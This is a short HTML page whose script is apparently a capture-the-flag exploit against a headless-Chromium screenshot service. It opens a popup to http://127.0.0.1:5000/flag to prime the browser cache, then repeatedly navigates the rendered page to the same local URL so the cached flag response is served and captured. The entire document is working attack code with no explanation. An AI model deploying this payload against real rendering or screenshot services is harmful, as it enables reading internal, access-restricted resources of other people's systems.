<!doctype html>
<html>
<body>
<script>
  // 1) Prime cache with a request likely sent without page-level extra headers
  const w = window.open('about:blank', '_blank');
  if (w) w.location = 'http://127.0.0.1:5000/flag';

  // 2) Navigate the screenshot page to same URL so Chromium serves cached response
  setTimeout(() => {
    location.href = 'http://127.0.0.1:5000/flag';
  }, 200);

  // Optional: if timing is tight, keep retrying quickly
  setTimeout(() => { location.href = 'http://127.0.0.1:5000/flag'; }, 600);
</script>
</body>
</html>
